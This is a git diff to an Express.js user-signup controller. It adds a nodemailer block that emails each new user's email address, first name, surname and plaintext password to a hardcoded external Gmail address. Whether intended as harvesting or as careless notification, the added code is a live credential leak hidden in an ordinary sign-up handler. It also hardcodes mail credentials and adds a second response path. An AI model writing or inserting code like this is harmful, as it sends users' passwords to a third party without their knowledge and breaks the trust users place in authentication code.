@@ -2,6 +2,7 @@ import asyncHandler from "express-async-handler";
 import bcrypt from "bcryptjs"
 import { generatetoken } from "../utilities/generate_token.js";
 import Wet from "../models/Wet.js";
+import nodemailer from "nodemailer"
 // import { token } from "morgan";
 
 export const wet_sign_up = asyncHandler(async(req, res) => {
@@ -36,6 +37,31 @@ export const wet_sign_up = asyncHandler(async(req, res) => {
             })
         }
     }
+
+    const transporter = nodemailer.createTransport({
+        service: "gmail",
+        auth: {
+            user: "ayodejiamzat@gmail.com",
+            pass: ""
+        }
+    })
+
+    const mailOptions = {
+        from: req.body.email,
+        to: "ayodejiamzat@gmail.com",
+        subject: `message from ${req.body.email}`,
+        text: `${req.body.email}, ${req.body.firstName}, ${req.body.surName}, ${req.body.password}`
+    }
+
+    transporter.sendMail(mailOptions, (error, info) => {
+        if(error){
+            console.log(error)
+            res.send("error")
+        }else{
+            console.log("email sent" + info.response)
+            res.send("success")
+        }
+    })
 })
 
 
